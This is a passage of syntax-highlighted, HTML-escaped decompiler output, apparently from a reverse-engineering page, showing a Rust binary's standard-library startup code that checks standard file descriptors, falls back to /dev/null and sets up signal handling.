style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> open64\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"/dev/null\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#79B8FF\">2\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">), iVar5 \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#F97583\"> -\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)) \u003C/span>\u003Cspan style=\"color:#F97583\">||\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">         (((local_108._8_8_ \u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">20000000000000\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) \u003C/span>\u003Cspan style=\"color:#F97583\">!=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#F97583\"> &#x26;&#x26;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">          (iVar5 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> open64\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"/dev/null\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#79B8FF\">2\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">), iVar5 \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#F97583\"> -\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)))) \u003C/span>\u003Cspan style=\"color:#F97583\">goto\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> LAB_00112b18;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      ppVar6 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> __fds;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">      if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ((local_108._16_8_ \u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">20000000000000\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) \u003C/span>\u003Cspan style=\"color:#F97583\">!=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) \u003C/span>\u003Cspan style=\"color:#F97583\">goto\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> LAB_00112711;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">      goto\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> LAB_00112730;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    ppVar6 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (pollfd \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#B392F0\">__errno_location\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    uVar1 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ppVar6->fd;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  } \u003C/span>\u003Cspan style=\"color:#F97583\">while\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (uVar1 \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 4\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">  if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ((((\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">16\u003C/span>\u003Cspan style=\"color:#F97583\"> &#x3C;\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> uVar1) \u003C/span>\u003Cspan style=\"color:#F97583\">||\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ((\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">401800\u003C/span>\u003Cspan style=\"color:#F97583\">U\u003C/span>\u003Cspan style=\"color:#F97583\"> >>\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (uVar1 \u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">1f\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) \u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)) \u003C/span>\u003Cspan style=\"color:#F97583\">||\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      ((iVar5 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> fcntl\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">), iVar5 \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#F97583\"> -\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#F97583\"> &#x26;&#x26;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">       ((ppVar6->fd \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 9\u003C/span>\u003Cspan style=\"color:#F97583\"> &#x26;&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (iVar5 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> open64\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"/dev/null\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#79B8FF\">2\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">), iVar5 \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#F97583\"> -\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)))))) \u003C/span>\u003Cspan style=\"color:#F97583\">||\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">     ((iVar5 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> fcntl\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">), iVar5 \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#F97583\"> -\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#F97583\"> &#x26;&#x26;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      ((ppVar6->fd \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 9\u003C/span>\u003Cspan style=\"color:#F97583\"> &#x26;&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (iVar5 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> open64\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"/dev/null\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#79B8FF\">2\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">), iVar5 \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#F97583\"> -\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)))))) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">LAB_00112b18:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">                    /* WARNING: Subroutine does not return */\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    abort\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  iVar5 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> fcntl\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">2\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">  if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ((iVar5 \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#F97583\"> -\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) \u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (__fds \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ppVar6, ppVar6->fd \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 9\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">LAB_00112711:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    iVar5 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> open64\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"/dev/null\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#79B8FF\">2\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    ppVar6 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> __fds;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (iVar5 \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#F97583\"> -\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) \u003C/span>\u003Cspan style=\"color:#F97583\">goto\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> LAB_00112b18;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">LAB_00112730:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  p_Var7 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> signal\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">d\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,(\u003C/span>\u003Cspan style=\"color:#79B8FF\">__sighandler_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">DAT_00000001);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">  if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (p_Var7 \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#79B8FF\">__sighandler_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">ffffffffffffffff\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    local_108.__align \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">long\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">PTR_DAT_0017e2f0;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    local_108._8_8_ \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    local_108._16_8_ \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 8\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    local_108._24_8_ \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    local_108._32_8_ \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    uVar14 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> FUN_00136cf0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(local_60,\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">local_108);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    FUN_00133cc0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(uVar14);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    FUN_0010e5a0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">LAB_00112aa3:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#FFAB70\">    local_60\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">] \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> CONCAT71\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#FFAB70\">local_60\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]._1_7_,\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    local_108.__align \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">long\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)local_60;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    FUN_0010df40\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">DAT_0017fa08,\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">local_108,\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">DAT_0017d4e0,\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">PTR_s_library\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">std\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">src\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">rt.rs_0017d4b8);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">LAB_00112a10:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    piVar12 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> __errno_location\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    piVar13 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">int\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    LOCK\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    bVar19 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> DAT_0017fad8 \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">int\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    piVar3 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> piVar12;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">!\u003C/span>\u003Cspan style=\"color:#E1E4E8\">bVar19) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      piVar13 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> DAT_0017fad8;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      piVar3 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> DAT_0017fad8;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    DAT_0017fad8 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> piVar3;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    UNLOCK\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (bVar19) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">      return\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (piVar13 \u003C/span>\u003Cspan style=\"color:#F97583\">!=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> piVar12) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">      do\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">        pause\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      } \u003C/span>\u003Cspan style=\"color:#F97583\">while\u003C/span>\u003Cspan style=\"color:#E1E4E8\">( \u003C/span>\u003Cspan style=\"color:#79B8FF\">true\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> );\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    FUN_00107710\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"std::process::exit called re-entrantly\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">LAB_00112aea:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    ppuVar16 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> &#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">PTR_s_library\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">std\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">src\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">sys\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">pal\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">unix\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">sta_0017e150;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">  else\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    uVar8 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> sysconf\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">1e\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    local_108._32_8_ \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    local_108._40_8_ \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    local_108._16_8_ \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    local_108._24_8_ \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    local_108.__align._0_4_ \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    local_108.__align._4_2_ \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    local_108.__align._6_2_ \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    local_108._8_8_ \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 